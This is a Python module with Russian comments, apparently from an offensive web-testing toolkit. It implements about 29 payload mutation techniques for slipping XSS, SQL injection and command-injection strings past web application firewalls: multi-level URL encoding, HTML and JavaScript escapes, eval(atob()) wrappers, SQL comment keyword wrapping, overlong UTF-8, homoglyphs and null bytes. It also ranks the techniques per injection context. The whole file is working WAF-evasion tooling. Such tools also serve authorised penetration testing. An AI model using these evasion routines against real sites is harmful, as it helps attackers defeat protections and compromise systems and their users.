"""payload_obfuscate v2 — 20+ payload mutation techniques for WAF bypass.

API для других модулей:
    from modules.evasion.payload_obfuscate import obfuscate, best_for_context
    variants = obfuscate("<script>alert(1)</script>", method="all")
    best = best_for_context("<script>alert(1)</script>", context="html_body")
"""
import urllib.parse
import random
import base64
import re


# ============================================================
# Базовые кодировки
# ============================================================

def url_enc(s):
    """URL encode — %3C script %3E."""
    return urllib.parse.quote(s, safe="")


def double_url_enc(s):
    """Двойное URL-кодирование — %253C."""
    return urllib.parse.quote(url_enc(s), safe="")


def triple_url_enc(s):
    """Тройное URL-кодирование."""
    return urllib.parse.quote(double_url_enc(s), safe="")


def html_ent(s):
    """HTML entities — &#x3c;script&#x3e;."""
    return "".join(f"&#x{ord(c):x};" for c in s)


def html_named(s):
    """HTML named entities где возможно."""
    named = {"<": "&lt;", ">": "&gt;", "&": "&amp;",
             '"': "&quot;", "'": "&apos;"}
    return "".join(named.get(c, c) for c in s)


def html_decimal(s):
    """Decimal HTML entities — &#60;script&#62;."""
    return "".join(f"&#{ord(c)};" for c in s)


def js_hex_esc(s):
    """JS hex escape — \\x3cscript\\x3e."""
    return "".join(f"\\x{ord(c):02x}" for c in s)


def js_unicode_esc(s):
    """JS unicode escape — \\u003cscript\\u003e."""
    return "".join(f"\\u{ord(c):04x}" for c in s)


def json_unicode_esc(s):
    """JSON unicode escape (без leading backslash) — \\u003c."""
    return "".join(f"\\u{ord(c):04x}" for c in s)


def base64_basic(s):
    """Base64."""
    return base64.b64encode(s.encode()).decode()


def base64_in_eval(s):
    """eval(atob('...')) — JS обфускация."""
    b64 = base64.b64encode(s.encode()).decode()
    return f"eval(atob('{b64}'))"


def base64_in_function(s):
    """Function('atob(...)')() — JS обфускация."""
    b64 = base64.b64encode(s.encode()).decode()
    return f"Function('return atob(\\'{b64}\\')')()"


def hex_enc(s):
    """Hex encoding — %3c%73%63%72... или 3c736372..."""
    return "".join(f"%{ord(c):02x}" for c in s)


def hex_raw(s):
    """Raw hex (без %)."""
    return "".join(f"{ord(c):02x}" for c in s)


def utf16be_esc(s):
    """UTF-16BE byte escapes."""
    return "".join(f"%{b:02x}" for b in s.encode("utf-16-be"))


def utf16le_esc(s):
    """UTF-16LE byte escapes."""
    return "".join(f"%{b:02x}" for b in s.encode("utf-16-le"))


# ============================================================
# Обфускации для WAF
# ============================================================

def case_random(s):
    """Case-mix — <ScRiPt>."""
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)


def comment_inject_sql(s):
    """SQL inline comments — UNION/**/SELECT/**/."""
    keywords = ["UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "LIKE",
                "INSERT", "UPDATE", "DELETE", "SLEEP", "BENCHMARK"]
    out = s
    for kw in keywords:
        out = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", out, flags=re.IGNORECASE)
    return out


def comment_inject_html(s):
    """HTML-комментарии в тегах — <scr<!---->ipt>."""
    return s.replace("<", "<!----><").replace(">", "><!---->")


def whitespace_tab(s):
    """Space → tab."""
    return s.replace(" ", "\t")


def whitespace_newline(s):
    """Space → newline."""
    return s.replace(" ", "\n")


def whitespace_comment(s):
    """Space → /**/."""
    return s.replace(" ", "/**/")


def whitespace_plus(s):
    """Space → + (URL)."""
    return s.replace(" ", "+")


def fullwidth(s):
    """ASCII → fullwidth Unicode (＜script＞)."""
    return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in s)


def homoglyph(s):
    """Гомоглифы для < и >."""
    subs = {"<": "‹", ">": "›", "(": "⁽", ")": "⁾",
            "/": "⁄", "'": "′", '"': "″"}
    return "".join(subs.get(c, c) for c in s)


def overlong_utf8(s):
    """Overlong UTF-8 — < → %c0%bc."""
    subs = {
        "<": "%c0%bc", ">": "%c0%be", "/": "%c0%af",
        "'": "%c0%a7", '"': "%c0%a2", "=": "%c0%bd",
        "(": "%c0%a8", ")": "%c0%a9", " ": "%c0%a0",
        ";": "%c0%bb", "&": "%c0%a6",
    }
    return "".join(subs.get(c, c) for c in s)


def string_concat(s):
    """Разбиение строки на конкатенации — '<scr'+'ipt>'."""
    if len(s) < 4:
        return s
    mid = len(s) // 2
    return f"'{s[:mid]}'+'{s[mid:]}'"


def null_byte_inject(s):
    """Вставка %00 после первой спецпоследовательности."""
    if " " in s:
        i = s.find(" ")
        return s[:i] + "%00" + s[i:]
    return s + "%00"


def chunked_split(s, size=3):
    """Разбиение на chunks с %00 — %3c%00%73%00%63..."""
    return "%00".join(hex_enc(s[i:i+size]) for i in range(0, len(s), size))


# ============================================================
# Регистр методов
# ============================================================

METHODS = {
    # базовые кодировки
    "url":             url_enc,
    "url2":            double_url_enc,
    "url3":            triple_url_enc,
    # HTML
    "html_hex":        html_ent,
    "html_named":      html_named,
    "html_dec":        html_decimal,
    # JS
    "js_hex":          js_hex_esc,
    "js_uni":          js_unicode_esc,
    "json_uni":        json_unicode_esc,
    # base64
    "b64":             base64_basic,
    "b64_eval":        base64_in_eval,
    "b64_func":        base64_in_function,
    # hex
    "hex_pct":         hex_enc,
    "hex_raw":         hex_raw,
    # UTF
    "utf16be":         utf16be_esc,
    "utf16le":         utf16le_esc,
    # WAF-bypass
    "case":            case_random,
    "sql_comment":     comment_inject_sql,
    "html_comment":    comment_inject_html,
    "ws_tab":          whitespace_tab,
    "ws_nl":           whitespace_newline,
    "ws_comment":      whitespace_comment,
    "ws_plus":         whitespace_plus,
    "fullwidth":       fullwidth,
    "homoglyph":       homoglyph,
    "overlong":        overlong_utf8,
    "concat":          string_concat,
    "null_byte":       null_byte_inject,
    "chunked":         chunked_split,
}


# ============================================================
# Публичный API
# ============================================================

def obfuscate(payload, method="all"):
    """
    Обфусцирует payload указанным методом или всеми.
    Возвращает:
      - method="all" → list[(method_name, obfuscated_payload)]
      - method="<name>" → obfuscated string
    """
    if method == "all":
        out = []
        for name, fn in METHODS.items():
            try:
                out.append((name, fn(payload)))
            except Exception:
                continue
        return out
    fn = METHODS.get(method)
    if not fn:
        return payload
    try:
        return fn(payload)
    except Exception:
        return payload


# оптимальные методы под контекст
CONTEXT_PREFERENCES = {
    "html_body":   ["html_hex", "html_named", "html_dec", "fullwidth", "case"],
    "attr_double": ["url", "url2", "html_hex", "homoglyph"],
    "attr_single": ["url", "url2", "html_hex", "homoglyph"],
    "js_string":   ["js_hex", "js_uni", "url", "url2", "case"],
    "json":        ["json_uni", "url", "b64"],
    "sql":         ["sql_comment", "case", "ws_comment", "ws_tab", "overlong"],
    "cmd":         ["ws_tab", "ws_nl", "concat", "hex_raw"],
    "url_param":   ["url", "url2", "url3", "overlong"],
    "xml":         ["html_hex", "html_dec", "html_named"],
    "css":         ["js_hex", "url", "fullwidth"],
}


def best_for_context(payload, context="html_body"):
    """
    Возвращает ordered list обфусцированных вариантов, релевантных контексту.
    Первый — самый эффективный.
    """
    prefs = CONTEXT_PREFERENCES.get(context, list(METHODS.keys()))
    out = []
    for name in prefs:
        fn = METHODS.get(name)
        if not fn:
            continue
        try:
            out.append((name, fn(payload)))
        except Exception:
            continue
    return out


# ============================================================
# Модуль
# ============================================================

class PayloadObfuscate:
    def run(self, session, logger):
        # источник payload — --extra payload=...
        payload = "<script>alert(1)</script>"
        for x in getattr(session, "extra", []) or []:
            if x.startswith("payload="):
                payload = x[8:]

        print(f"[payload_obfuscate v2] input: {payload[:80]}")
        print(f"[payload_obfuscate v2] {len(METHODS)} methods")

        results = {}
        for name, fn in METHODS.items():
            try:
                out = fn(payload)
                results[name] = out
                # показываем первые 80 символов
                print(f"  {name:14s} -> {out[:80]}")
            except Exception as e:
                print(f"  {name:14s} ERROR: {e}")

        # лучший под html_body (для демонстрации)
        ctx = "html_body"
        for x in getattr(session, "extra", []) or []:
            if x.startswith("ctx="):
                ctx = x[4:]

        print()
        print(f"[payload_obfuscate v2] best for context '{ctx}':")
        for name, out in best_for_context(payload, ctx)[:5]:
            print(f"  {name:14s} -> {out[:80]}")

        logger.info("payload_obfuscate",
                    methods=len(METHODS), context=ctx)

        return {
            "payload": payload,
            "methods_count": len(METHODS),
            "results": results,
        }
